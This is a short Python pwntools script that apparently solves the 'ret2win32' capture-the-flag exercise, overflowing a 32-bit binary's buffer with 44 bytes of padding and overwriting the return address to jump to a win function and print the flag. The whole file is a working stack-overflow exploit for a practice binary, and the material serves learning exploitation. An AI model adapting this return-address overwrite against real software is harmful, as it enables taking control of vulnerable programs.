from pwn import *

e = ELF('./ret2win32')
p = e.process()

print(p.recv().decode())

padding = b'A' * 44
address = p32(0x8048659)

payload = padding + address

p.sendline(payload)

print(p.recvuntil("Here's your flag:").decode())
flag = p.recvline().decode()

success(flag)
